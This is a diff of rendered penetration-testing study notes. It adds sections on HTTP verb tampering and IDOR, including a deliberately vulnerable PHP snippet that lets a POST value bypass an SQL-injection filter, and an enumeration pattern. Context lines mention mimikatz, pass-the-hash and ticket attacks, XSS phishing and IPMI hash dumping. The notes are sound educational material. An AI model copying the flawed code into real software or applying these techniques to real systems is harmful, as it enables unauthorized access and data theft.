+<tr><th>Verb</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>GET</code></td><td>Retrieve a resource</td></tr>
+<tr><td><code>POST</code></td><td>Submit data to be processed</td></tr>
+<tr><td><code>HEAD</code></td><td>Identical to GET but returns headers only — no response body</td></tr>
+<tr><td><code>PUT</code></td><td>Write the request payload to the specified location</td></tr>
+<tr><td><code>DELETE</code></td><td>Delete the resource at the specified location</td></tr>
+<tr><td><code>OPTIONS</code></td><td>List accepted HTTP methods/options for a resource</td></tr>
+<tr><td><code>PATCH</code></td><td>Apply partial modifications to a resource</td></tr>
+</tbody>
+</table>
+</div>
+<p><code>PUT</code> and <code>DELETE</code> in particular can be destructive — writing or removing files in the webroot — if the server is not locked down.</p>
+<h2 id="vulnerability-sources"><a class="header" href="#vulnerability-sources">Vulnerability sources</a></h2>
+<p>HTTP Verb Tampering vulnerabilities arise from two distinct sources:</p>
+<h3 id="insecure-server-configuration"><a class="header" href="#insecure-server-configuration">Insecure server configuration</a></h3>
+<p>Authentication rules scoped to specific methods leave other methods unauthenticated. Example Apache/similar config:</p>
+<pre><code class="language-xml">&lt;Limit GET POST&gt;
+    Require valid-user
+&lt;/Limit&gt;
+</code></pre>
+<p>This enforces authentication on GET and POST, but a request using <code>HEAD</code> (or any other unlisted verb) bypasses the rule entirely. An attacker can reach protected pages without credentials.</p>
+<h3 id="insecure-coding-1"><a class="header" href="#insecure-coding-1">Insecure coding</a></h3>
+<p>Filters or sanitization applied only to one HTTP method while the underlying query uses a broader parameter source. Example PHP:</p>
+<pre><code class="language-php">$pattern = "/^[A-Za-z\s]+$/";
+
+if (preg_match($pattern, $_GET["code"])) {
+    $query = "Select * from ports where port_code like '%" . $_REQUEST["code"] . "%'";
+    ...
+}
+</code></pre>
+<p>The sanitization check runs against <code>$_GET["code"]</code>, but the query uses <code>$_REQUEST["code"]</code> — which includes POST parameters. An attacker sends the payload via <strong>POST</strong> (leaving GET empty), the filter passes on the empty GET value, and the unsanitized POST value reaches the query. The SQL injection mitigation is bypassed entirely.</p>
+<h2 id="comparison-1"><a class="header" href="#comparison-1">Comparison</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Cause</th><th>Prevalence</th></tr>
+</thead>
+<tbody>
+<tr><td>Insecure server config</td><td>Auth restricted to specific verbs</td><td>Less common — documentation warns against it</td></tr>
+<tr><td>Insecure coding</td><td>Filter applied to one method, query uses another</td><td>More common — easy mistake in application code</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="intro-to-idor"><a class="header" href="#intro-to-idor">Intro to IDOR</a></h1>
+<h2 id="what-idor-is"><a class="header" href="#what-idor-is">What IDOR is</a></h2>
+<p><strong>Insecure Direct Object References (IDOR)</strong> occur when a web application exposes a direct reference to an internal object (file, database record, API resource) and the end-user can manipulate that reference to access other objects. The vulnerability is not the exposed reference itself — it is the <strong>absence of a back-end access control system</strong> that validates whether the requesting user is authorized to access the referenced object.</p>
+<p>Example: <code>download.php?file_id=123</code> returns the user’s uploaded file. Changing the parameter to <code>file_id=124</code> returns another user’s file if no access control check exists on the back-end.</p>
+<h2 id="why-idor-is-so-common"><a class="header" href="#why-idor-is-so-common">Why IDOR is so common</a></h2>
+<ul>
+<li>Building a solid access control system is inherently difficult</li>
+<li>Automating detection of access control weaknesses is also hard, so flaws survive to production</li>
+<li>Many developers skip back-end access control entirely, relying on the <strong>front-end</strong> to show only the current user’s data — manually crafting HTTP requests exposes full access to all users’ data</li>
+<li>Found in major platforms (Facebook, Instagram, Twitter) despite mature security programs</li>
+</ul>
+<h2 id="what-makes-it-a-vulnerability"><a class="header" href="#what-makes-it-a-vulnerability">What makes it a vulnerability</a></h2>
+<p>A direct reference alone is not a vulnerability. It becomes one when <strong>either</strong>:</p>
+<ul>
+<li>No back-end access control exists at all</li>
+<li>The access control does not compare the requesting user’s authentication/authorization against the resource’s access list</li>
+</ul>
+<p>Even when pages, functions, or APIs are restricted in the UI, if a user reaches them via a shared/guessed link and the back-end does not enforce authorization, the resource is exposed.</p>
+<p>A proper mitigation is a system like <strong>Role-Based Access Control (RBAC)</strong> that validates every request server-side, independent of front-end logic.</p>
+<h2 id="impact-1"><a class="header" href="#impact-1">Impact</a></h2>
+<h3 id="information-disclosure"><a class="header" href="#information-disclosure">Information disclosure</a></h3>
+<p>Accessing private files and data belonging to other users — personal documents, credit card data, PII. This is the most basic IDOR outcome.</p>
+<h3 id="data-modification-and-account-takeover"><a class="header" href="#data-modification-and-account-takeover">Data modification and account takeover</a></h3>
+<p>If the reference allows write operations (update, delete), an attacker can modify or destroy other users’ data, potentially achieving <strong>complete account takeover</strong>.</p>
+<h3 id="privilege-escalation-insecure-function-calls"><a class="header" href="#privilege-escalation-insecure-function-calls">Privilege escalation (insecure function calls)</a></h3>
+<p>Many apps expose admin-only URL parameters or API endpoints in front-end code but disable them client-side for non-admin users. If the back-end does not explicitly deny non-admin callers, an attacker with a standard account can:</p>
+<ul>
+<li>Call administrative functions directly</li>
+<li>Change other users’ passwords</li>
+<li>Grant elevated roles</li>
+</ul>
+<p>This can lead to <strong>full takeover of the entire web application</strong>.</p>
+<h2 id="attack-pattern"><a class="header" href="#attack-pattern">Attack pattern</a></h2>
+<ol>
+<li>Identify a direct reference (database ID, URL parameter, API path segment)</li>
+<li>Test adjacent or sequential values to see if other objects are accessible</li>
+<li>Map the reference pattern and enumerate systematically</li>
+<li>Determine whether the access is read-only (disclosure) or read-write (modification/deletion)</li>
+</ol>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="introduction-to-web-attacks"><a class="header" href="#introduction-to-web-attacks">Introduction to Web Attacks</a></h1>
 <h2 id="why-web-attacks-matter"><a class="header" href="#why-web-attacks-matter">Why web attacks matter</a></h2>
@@ -28877,7 +27876,7 @@ mimikatz # sekurlsa::credman
 </ol>
 <p>Attackers can abuse this by obtaining valid certificates through AD CS attacks and using them to request TGTs.</p>
 <hr>
-<h2 id="prerequisites-3"><a class="header" href="#prerequisites-3">Prerequisites</a></h2>
+<h2 id="prerequisites-2"><a class="header" href="#prerequisites-2">Prerequisites</a></h2>
 <p>To perform a Pass the Certificate attack, you need:</p>
 <ul>
 <li>A valid X.509 certificate for a target user or computer</li>
@@ -29095,7 +28094,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="pass-the-hash-pth-attacks"><a class="header" href="#pass-the-hash-pth-attacks">Pass the Hash (PtH) Attacks</a></h1>
 <p>A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn’t need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash is not salted and remains static for every session until the password is changed.</p>
-<h2 id="prerequisites-4"><a class="header" href="#prerequisites-4">Prerequisites</a></h2>
+<h2 id="prerequisites-3"><a class="header" href="#prerequisites-3">Prerequisites</a></h2>
 <p>The attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:</p>
 <ul>
 <li>Dumping the local SAM database from a compromised host</li>
@@ -29289,7 +28288,7 @@ Info: Establishing connection to remote endpoint
 </ol>
 <p>Once the user has their TGT, they do not have to prove who they are with their password again.</p>
 <hr>
-<h2 id="prerequisites-5"><a class="header" href="#prerequisites-5">Prerequisites</a></h2>
+<h2 id="prerequisites-4"><a class="header" href="#prerequisites-4">Prerequisites</a></h2>
 <p>To perform a Pass the Ticket attack, you need a valid Kerberos ticket:</p>
 <ul>
 <li><strong>Service Ticket (TGS)</strong> - Allows access to a particular resource</li>
@@ -30127,7 +29126,7 @@ var task = document.URL.substring(pos + 5, document.URL.length);
 <h2 id="what-it-is-2"><a class="header" href="#what-it-is-2">What it is</a></h2>
 <p><strong>XSS phishing</strong> uses cross-site scripting to show <strong>legitimate-looking UI</strong> (often a <strong>login form</strong>) on a site the victim already trusts. Submitted credentials go to an <strong>attacker-controlled</strong> server so the attacker can <strong>log in as the victim</strong> and access accounts and sensitive data.</p>
 <p>In <strong>authorized</strong> work, a known XSS on an org’s app can double as a <strong>phishing simulation</strong>: employees who trust the domain may not expect a malicious prompt, which measures <strong>security awareness</strong>.</p>
-<h2 id="prerequisites-6"><a class="header" href="#prerequisites-6">Prerequisites</a></h2>
+<h2 id="prerequisites-5"><a class="header" href="#prerequisites-5">Prerequisites</a></h2>
 <p>You need a <strong>working XSS</strong> on the target (stored, reflected, or DOM-based). Delivery matches normal XSS (for example, a <strong>malicious URL</strong> for <strong>reflected</strong> XSS on a <code>GET</code> parameter).</p>
 <h2 id="lab-pattern-phishing-image-url-viewer"><a class="header" href="#lab-pattern-phishing-image-url-viewer">Lab pattern: <code>/phishing</code> image URL viewer</a></h2>
 <p>The module uses a simple <strong>online image viewer</strong>: you pass an image <strong>URL</strong> and the page renders it, e.g.:</p>
@@ -30604,7 +29603,7 @@ if (isset($_GET['c'])) {
 <li><a href="#network-policies">Network Policies</a>
 <ul>
 <li><a href="#overview-16">Overview</a></li>
-<li><a href="#key-concepts-3">Key Concepts</a></li>
+<li><a href="#key-concepts-2">Key Concepts</a></li>
 <li><a href="#common-fields-in-a-network-policy">Common Fields in a Network Policy</a></li>
 <li><a href="#example-network-policies">Example Network Policies</a>
 <ul>
@@ -31371,7 +30370,7 @@ spec:
 </code></pre>
 </li>
 </ul>
-<h3 id="key-concepts-3"><a class="header" href="#key-concepts-3">Key Concepts</a></h3>
+<h3 id="key-concepts-2"><a class="header" href="#key-concepts-2">Key Concepts</a></h3>
 <ol>
 <li><strong>Namespace Scope</strong>: Network policies are applied at the namespace level.</li>
 <li><strong>Selector-Based Rules</strong>:
@@ -36077,7 +35076,7 @@ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run
 <li><strong>NFSv4</strong>: Released in 2000, it introduced significant enhancements, including stateful protocol, improved security features (like Kerberos authentication), and support for file locking and delegation.</li>
 <li><strong>NFSv4.1 and NFSv4.2</strong>: These are incremental updates to NFSv4, adding features like parallel NFS (pNFS) for improved performance and additional security enhancements.</li>
 </ul>
-<h2 id="configuration-2"><a class="header" href="#configuration-2">Configuration</a></h2>
+<h2 id="configuration-1"><a class="header" href="#configuration-1">Configuration</a></h2>
 <ul>
 <li>NFS is generally simple to configure. The <code>/etc/exports</code> file on the server specifies which directories are shared and the permissions for each client.
 <pre><code class="language-bash">rnemeth@htb[/htb]$ cat /etc/exports 
@@ -42297,7 +41296,7 @@ C:\Windows\system32&gt; whoami
 nt authority\system
 </code></pre>
 <hr>
-<h2 id="key-takeaways-7"><a class="header" href="#key-takeaways-7">Key Takeaways</a></h2>
+<h2 id="key-takeaways-6"><a class="header" href="#key-takeaways-6">Key Takeaways</a></h2>
 <ol>
 <li><strong>Module Structure</strong>: Understanding the <code>&lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</code> format helps identify appropriate modules</li>
 <li><strong>Search Functionality</strong>: Powerful search with multiple keywords and filters helps find the right module quickly</li>
